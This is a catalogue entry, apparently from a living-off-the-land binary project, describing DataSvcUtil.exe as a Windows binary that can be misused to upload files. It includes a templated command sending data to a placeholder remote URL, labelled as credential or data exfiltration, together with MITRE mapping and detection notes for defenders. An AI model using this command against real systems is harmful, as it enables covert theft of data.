---
id: windows-upload-datasvcutil
namespace: windows:upload:datasvcutil
name: datasvcutil
description: 'DataSvcUtil.exe is a command-line tool provided by WCF Data Services
  that consumes an Open Data Protocol (OData) feed and generates the client data service
  classes that are needed to access a data service from a .NET Framework client application.
  Located at: C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe.'
author: Ialle Teixeira
version: 1.0.0
capabilities:
- network.transfer.upload
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- datasvcutil
parameters: []
features:
- network-intensive
- pipes-stdin
- pipes-stdout
- process-manip
- remote
execution:
  template: datasvcutil
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Upload file, credentials or data exfiltration in general (Upload file)
  command: DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
references:
- label: wcf-data-service-client-utility-datasvcutil-exe
  url: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe
- label: generating-the-data-service-client-library-wcf-dat
  url: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services
- label: how-to-add-a-data-service-reference-wcf-data-servi
  url: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services
techniques:
- exfiltration
mitre_ids:
- T1567
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml
- type: ioc
  description: The DataSvcUtil.exe tool is installed in the .NET Framework directory.
- type: ioc
  description: Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network
    IPS/IDS.
- type: ioc
  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts
    launching DataSvcUtil.
install:
- method: choco
  package_name: datasvcutil
  commands:
  - choco install datasvcutil
---

# datasvcutil

datasvcutil is a Windows LOLBin. DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application. Located at: C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe.
